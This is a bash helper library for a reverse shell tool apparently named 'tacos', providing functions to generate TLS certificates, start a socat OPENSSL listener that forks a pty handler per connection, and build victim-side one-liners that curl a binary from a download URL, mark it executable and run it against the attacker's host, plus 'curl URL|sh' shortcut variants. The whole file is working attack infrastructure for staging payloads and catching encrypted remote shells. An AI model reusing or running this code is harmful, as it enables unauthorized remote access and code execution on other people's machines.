#!/bin/bash
# Shared functions for socat listener scripts

generate_tls_certs() {
    echo -e "\n\n\n[+] Generating tls certs and keys"
    if [ -f server.pem ]; then
        echo "[+] Files already exist, using server.pem"
    else
        rm -f server.key server.crt server.pem
        yes "" | openssl req -newkey rsa:2048 -nodes -keyout server.key -x509 -days 30 -out server.crt
        cat server.key server.crt >server.pem
    fi
}

check_tmux() {
    if [[ -z "${TMUX}" ]]; then
        echo "Must be run in tmux"
        exit 92
    fi
}

set_binary_and_script() {
    local basedir="$1"
    local windows="$2"
    if [[ "$windows" ]]; then
        BINARY="tacos.exe"
        SCRIPT="${basedir}/socat-forker-windows.sh"
    else
        BINARY="tacos"
        SCRIPT="${basedir}/socat-forker.sh"
    fi
}

check_tacos_present() {
    local binary="$1"
    local pwd=$(pwd)
    if [[ -f "./$binary" ]]; then
        echo "[+] ${binary} is already in ${pwd}"
    else
        printf "\033[1;31m[+] Put ${binary} in ${pwd} before launching reverse shell process\033[0m\n"
    fi
}

build_remote_cmd() {
    local download_url="$1"
    local binary="$2"
    local host="$3"
    local windows="$4"
    local tmp="$5"
    local shutdown_url="$6"

    local remote_cmd=""
    if [[ "$windows" ]]; then
        if [[ -n "$shutdown_url" ]]; then
            remote_cmd="curl -O $download_url && curl $shutdown_url && .\\${binary} ${host}"
        else
            remote_cmd="curl -O $download_url && .\\${binary} ${host}"
        fi
    else
        if [[ -n "$shutdown_url" ]]; then
            remote_cmd="curl -s -O $download_url && curl $shutdown_url && chmod +x ${binary} && ./${binary} ${host}"
        else
            remote_cmd="curl -s -O $download_url && chmod +x ${binary} && ./${binary} ${host}"
        fi
        if [[ "$tmp" ]]; then
            if [[ -n "$shutdown_url" ]]; then
                remote_cmd="mkdir -p /tmp/tacos && curl -s -o /tmp/tacos/${binary} $download_url && curl $shutdown_url && chmod +x /tmp/tacos/${binary} && /tmp/tacos/${binary} ${host}"
            else
                remote_cmd="mkdir -p /tmp/tacos && curl -s -o /tmp/tacos/${binary} $download_url && chmod +x /tmp/tacos/${binary} && /tmp/tacos/${binary} ${host}"
            fi
        fi
    fi
    echo "$remote_cmd"
}

apply_shortcut() {
    local remote_cmd="$1"
    local shortcut_url="$2"

    echo "${remote_cmd}" > sh
    echo -e "\nsh -c \"\$(curl ${shortcut_url})\"\nsh <(curl ${shortcut_url})\ncurl ${shortcut_url}|sh\n"
}

start_socat_listener() {
    local lport="$1"
    local script="$2"
    local windows="$3"

    if [[ "$windows" ]]; then
        socat OPENSSL-LISTEN:${lport},cert=server.pem,verify=0,reuseaddr,fork EXEC:${script},pty
    else
        socat OPENSSL-LISTEN:${lport},cert=server.pem,verify=0,reuseaddr,fork EXEC:${script},pty,raw,echo=0
    fi
}
